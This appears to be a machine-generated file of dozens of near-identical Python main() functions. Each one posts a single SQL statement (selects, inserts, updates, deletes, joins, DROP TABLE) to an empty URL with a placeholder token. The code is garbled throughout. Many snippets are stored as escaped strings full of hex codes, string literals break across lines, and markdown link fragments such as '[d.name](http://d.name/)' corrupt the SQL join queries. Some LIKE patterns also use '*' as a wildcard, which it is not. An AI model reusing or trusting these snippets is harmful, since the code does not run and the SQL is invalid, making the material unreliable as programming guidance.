'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name FROM employees WHERE age > 30;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT COUNT\x28*\x29 FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22INSERT INTO employees (id, name, age) VALUES (1, 'John Doe', 30);\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22INSERT INTO employees (id, name, age) VALUES (2, 'Jane Doe', 28);\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22UPDATE employees SET age = 31 WHERE name = 'John Doe';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22UPDATE employees SET name = 'Johnny Doe' WHERE id = 1;\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22DELETE FROM employees WHERE id = 1;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22DELETE FROM employees WHERE name = 'Jane Doe';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22CREATE TABLE departments \x28id INT, name VARCHAR\x2850\x29, manager_id INT\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22INSERT INTO departments (id, name, manager_id) VALUES (1, 'Sales', 1);\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22INSERT INTO departments (id, name, manager_id) VALUES (2, 'Marketing', 2);\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM departments;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22UPDATE departments SET name = 'Sales & Marketing' WHERE id = 1;\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22DELETE FROM departments WHERE id = 2;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22ALTER TABLE departments ADD budget DECIMAL\x2810,2\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22ALTER TABLE departments DROP COLUMN manager_id;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22DROP TABLE departments;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees ORDER BY age DESC;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees ORDER BY name ASC, age DESC;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, COUNT\x28*\x29 FROM employees GROUP BY name;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT department_id, AVG\x28salary\x29 FROM employees GROUP BY department_id;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT [e.name]\x28http://e.name/\x29, [d.name]\x28http://d.name/\x29 FROM employees e INNER JOIN departments d ON e.department_id = [d.id]\x28http://d.id/\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT [e.name]\x28http://e.name/\x29, [d.name]\x28http://d.name/\x29 FROM employees e LEFT JOIN departments d ON e.department_id = [d.id]\x28http://d.id/\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT [e.name]\x28http://e.name/\x29, [d.name]\x28http://d.name/\x29 FROM employees e RIGHT JOIN departments d ON e.department_id = [d.id]\x28http://d.id/\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT [e.name]\x28http://e.name/\x29, [d.name]\x28http://d.name/\x29 FROM employees e FULL OUTER JOIN departments d ON e.department_id = [d.id]\x28http://d.id/\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name LIKE 'J%';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name LIKE '%e';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name LIKE '%oh%';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name IN ('John Doe', 'Jane Doe');\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE age BETWEEN 30 AND 40;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE name IS NULL;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE name IS NOT NULL;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT DISTINCT name FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees LIMIT 10;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees LIMIT 10 OFFSET 30;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT [e.name]\x28http://e.name/\x29, [d.name]\x28http://d.name/\x29 AS department_name FROM employees e INNER JOIN departments d ON e.department_id = [d.id]\x28http://d.id/\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT COUNT\x28*\x29 AS count FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT AVG\x28age\x29 AS average_age FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT MIN\x28age\x29 AS min_age, MAX\x28age\x29 AS max_age FROM employees;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, age FROM employees UNION SELECT name, age FROM managers;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, age FROM employees UNION ALL SELECT name, age FROM managers;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, age FROM employees INTERSECT SELECT name, age FROM managers;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT name, age FROM employees EXCEPT SELECT name, age FROM managers;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees WHERE age > \x28SELECT AVG\x28age\x29 FROM employees\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees e WHERE EXISTS \x28SELECT 1 FROM departments d WHERE e.department_id = [d.id]\x28http://d.id/\x29\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees e WHERE NOT EXISTS \x28SELECT 1 FROM departments d WHERE e.department_id = [d.id]\x28http://d.id/\x29\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22WITH high_earners AS \x28SELECT * FROM employees WHERE salary > 100000\x29 SELECT * FROM high_earners;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees e1 WHERE salary > \x28SELECT AVG\x28salary\x29 FROM employees e2 WHERE e1.department_id = e2.department_id\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22SELECT * FROM employees ORDER BY RANDOM\x28\x29 LIMIT 1;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name LIKE '_a%';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name LIKE '__*e';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name LIKE '%a*';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name NOT LIKE 'J%';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name NOT LIKE '%e';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name NOT LIKE '%oh%';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22SELECT * FROM employees WHERE name NOT IN ('John Doe', 'Jane Doe');\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
